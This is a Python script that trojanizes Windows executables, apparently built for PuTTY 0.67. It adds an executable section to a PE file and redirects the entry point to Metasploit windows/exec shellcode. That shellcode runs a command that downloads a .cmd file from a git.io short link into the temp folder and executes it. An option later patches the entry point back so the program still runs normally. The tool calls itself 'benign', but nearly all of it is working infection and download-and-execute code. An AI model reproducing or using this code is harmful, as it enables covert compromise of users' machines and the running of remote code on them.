import argparse
import pefile
import mmap
import os
import logging

from os import listdir
from os.path import isfile, join

# NOTE: THIS FILE IS BUILT AND CUSTOMIZED SPECIFICALLY FOR PUTTY V67

def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment

# is_vessel: indicates if a file would be selected as a holder containing the script
# if the value is false, the application will be injected with a new section
# which containing assembly code setting putty's entry point to its original entry point.
# i.e., this make the infected or normal putty program runs normally
def inject(exe_path, is_vessel=False):
    buf = b""
    if is_vessel:
        # windows/exec - 265 bytes
        # https://metasploit.com/
        # VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, 
        # CMD=cmd /C curl -o %tmp%\saboteur.cmd -sL 
        # https://git.io/JlUCT && %tmp%\saboteur.cmd
        buf =  b""
        buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
        buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
        buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
        buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
        buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
        buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
        buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
        buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
        buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
        buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
        buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
        buf += b"\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
        buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
        buf += b"\xff\xd5\x63\x6d\x64\x20\x2f\x43\x20\x63\x75\x72\x6c"
        buf += b"\x20\x2d\x6f\x20\x25\x74\x6d\x70\x25\x5c\x73\x61\x62"
        buf += b"\x6f\x74\x65\x75\x72\x2e\x63\x6d\x64\x20\x2d\x73\x4c"
        buf += b"\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x2e"
        buf += b"\x69\x6f\x2f\x4a\x6c\x55\x43\x54\x20\x26\x26\x20\x25"
        buf += b"\x74\x6d\x70\x25\x5c\x73\x61\x62\x6f\x74\x65\x75\x72"
        buf += b"\x2e\x63\x6d\x64\x00"

    # If the file is 
    else:
        # buf += b"\x90" * 10         # You can insert NOPs for nothings
        
        # The following is information of putty.exe version 0.67
        # address 550f0: original entry point of the normal exe file
        # address 004550f0: original entry point + image base
        # B8 F0504500       MOV EAX, 004550f0
        # FFD0              CALL EAX
        buf += b"\xB8\xF0\x50\x45\x00\xFF\xD0"

    shellcode = bytes(buf)

    # STEP 0x01 - Resize the Executable
    # Note: I added some more space to avoid error
    logging.debug("[*] STEP 0x01 - Resize the Executable")

    original_size = os.path.getsize(exe_path)
    logging.debug("\t[+] Original Size = %d" % original_size)
    fd = open(exe_path, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + 0x2000)
    map.close()
    fd.close()

    logging.debug("\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path))

    # STEP 0x02 - Add the New Section Header
    logging.debug("[*] STEP 0x02 - Add the New Section Header")

    pe = pefile.PE(exe_path)
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

    # Look for valid values for the new section header
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[last_section].PointerToRawData +
                        pe.sections[last_section].SizeOfRawData),
                    file_alignment)

    virtual_offset = align((pe.sections[last_section].VirtualAddress +
                            pe.sections[last_section].Misc_VirtualSize),
                        section_alignment)

    # CODE | EXECUTE | READ | WRITE
    characteristics = 0xE0000020
    # Section name must be equal to 8 bytes
    name = ".axc" + (4 * '\x00')

    # Create the section
    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    logging.debug("\t[+] Section Name = %s" % name)

    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, (virtual_size))
    logging.debug("\t[+] Virtual Size = %s" % hex(virtual_size))

    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    logging.debug("\t[+] Virtual Offset = %s" % hex(virtual_offset))

    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    logging.debug("\t[+] Raw Size = %s" % hex(raw_size))

    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    logging.debug("\t[+] Raw Offset = %s" % hex(raw_offset))
    # Set the following fields to zero
    pe.set_bytes_at_offset(new_section_offset + 24, str.encode(12 * '\x00'))

    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)
    logging.debug("\t[+] Characteristics = %s\n" % hex(characteristics))

    # STEP 0x03 - Modify the Main Headers
    logging.debug("[*] STEP 0x03 - Modify the Main Headers")
    pe.FILE_HEADER.NumberOfSections += 1
    logging.debug("\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections)
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
    logging.debug("\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage)

    pe.write(exe_path)

    pe = pefile.PE(exe_path)
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    new_ep = pe.sections[last_section].VirtualAddress
    logging.debug("\t[+] New Entry Point = %s" % hex(pe.sections[last_section].VirtualAddress))
    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    logging.debug("\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

    # STEP 0x04 - Inject the Shellcode in the New Section
    logging.debug("[*] STEP 0x04 - Inject the Shellcode in the New Section")

    raw_offset = pe.sections[last_section].PointerToRawData
    pe.set_bytes_at_offset(raw_offset, shellcode)
    logging.debug("\t[+] Shellcode wrote in the new section")

    pe.write(exe_path)

def get_all_exefile(path=""):
    if path == "":
        dir_path = ".\\"
    else:
        dir_path = path
    file_type = ".exe"
    only_files = [f for f in listdir(dir_path) if isfile(join(dir_path, f))]

    results = []

    for file in only_files:
        if file.endswith(file_type):
            results.append(os.path.join(path, file))
            logging.debug(results[-1])

    return results

def main():
    parser = argparse.ArgumentParser(description='A benign browser hijacking via portable executable injection')
    parser.add_argument('--file',
        help="Infect a single exe file as a trigger for the callback script",
        default=False,
        required=False,
        dest='filename')

    parser.add_argument('--unleash',
        help='Unleash file back to the normal stage',
        default=False,
        type=str,
        required=False,
        dest='path')
  
    parser.add_argument('--debug', help='Output debug logging to console', action='store_true')  
  
    args = parser.parse_args()
    # Debug: print debug log to console if true by setting logging level to DEBUG,
    # indicating that logging level DEBUG and more serious will be printed to the console 
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.WARNING)
    
    # If the program is provided with a path where the putty file is locating,
    # the putty program, which corrupts after the shellcode executed, will be fixed to run normally
    if args.path:
        inject(os.path.join(args.path,"putty.exe"), is_vessel=False)
    # If there were a single file, the file would be selected as a holder
    elif args.filename:
        inject(args.filename, is_vessel=True)
    # If no arguments provided
    else:
        parser.error('No arguments provided.')

    return

if __name__ == '__main__':
    main()